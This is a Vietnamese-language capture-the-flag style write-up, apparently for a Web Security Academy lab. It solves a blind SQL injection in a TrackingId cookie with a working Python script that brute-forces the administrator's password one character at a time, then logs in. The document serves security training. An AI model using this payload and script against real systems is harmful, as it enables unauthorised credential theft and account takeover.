>This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
>
>The results of the SQL query are not returned, and no error messages are displayed. But the application includes a `Welcome back` message in the page if the query returns any rows.
>
>The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.
>
>To solve the lab, log in as the `administrator` user.

Ở bài này công việc của chúng ta là cần chèn blind SQL để có thể tìm được mật khẩu của administrator. Đề bài đã cho ta biết phần có thể bị chèn SQL nằm ở cookie với truy vấn sẽ tìm tracking id trong database. Đầu tiên ta cần xem định dạng mẫu request trông như thế nào để có thể thực hiện chèn SQL.

![](images/Pasted%20image%2020261107230704.png)

Ở đây ta thấy sau khi ta vào trang sẽ nhận được 1 cookie bao gồm **TrackingId** và **session**. Và ta cũng thấy trong respone như đề bài đề cập nếu ta chèn kết quả truy vấn là TRUE thì ta thu được **Welcome back!** trong respone nhưng không hiện ở màn hình người dùng. Trước tiên ta cần nghĩ 1 script để có thể tự động dò được mật khẩu của administrator. Để tạo script ý tưởng của mình sẽ là dò trong bảng chữ cái và chữ số bruteforce sau đó check substring chỗ đó với điều kiện AND cùng TrackingId để check kết quả. Nếu kết quả đúng thì sẽ có Welcome back! trong respone thế nên ta sẽ kiểm tra nếu có Welcome back! thì ta sẽ lưu vào password và tăng vị trí check lên tiếp tục. Đến khi không còn chữ cái hay chữ số nào check được nữa thì lúc đó đã có được final password. Từ đây ta có thể viết script như sau:

```python
import requests
import string

url = "https://0aa800390356c69a81192a3400ff0081.web-security-academy.net/"

cookies = {
    "TrackingId": "",
    "session": "qNjx9lqTI5lB9OxHpR01AlYCbJ6lLCcu"
}

charset = string.ascii_letters + string.digits
password = ""

for position in range(1, 50):
    found = False
    for char in charset:
        payload = (
            "4SFi9ggJqvVzA4BM' AND " f"(SELECT SUBSTRING(password,{position},1) " f"FROM users WHERE username='administrator')='{char}'-- -"
        )
        cookies["TrackingId"] = payload
        response = requests.get(
            url,
            cookies=cookies,
            timeout=10
        )
        if "Welcome back" in response.text:
            password += char
            print(f"Position {position}: {char}")
            print(f"Password: {password}")
            found = True
            break
    if not found:
        break

print("\nFinal password:", password)
```

![](images/Pasted%20image%2020261107234027.png)

Ở đây sau khi dò thì ta đã xác định được mật khẩu của administrator và tiến hành đăng nhập vào.

![](images/Pasted%20image%2020261107234106.png)

Cuối cùng ta đã có thể đăng nhập vào tài khoản của admin mà không cần lộ bất kỳ thông tin nào trên màn hình người dùng. Từ đây ta có thể thấy nếu không sẽ lý triệt để được vấn đề boolean trả về kết quả respone khác nhau có thể dẫn đến Blind SQL Injection vô cùng nguy hiểm. Ví dụ điển hình là việc vào được tài khoản admin như trên có thể làm lộ nhiều thông tin quan trọng hay dù bất kỳ tài khoản nhân viên nội bộ nào bị truy cập đều có thể dẫn đến lộ thông tin mật và thậm chí còn đảm bảo tính tồn tại lâu dài persistant giúp cho attacker nắm quyền kiểm soát và làm được nhiều việc dưới tên một đích chỉ khác.
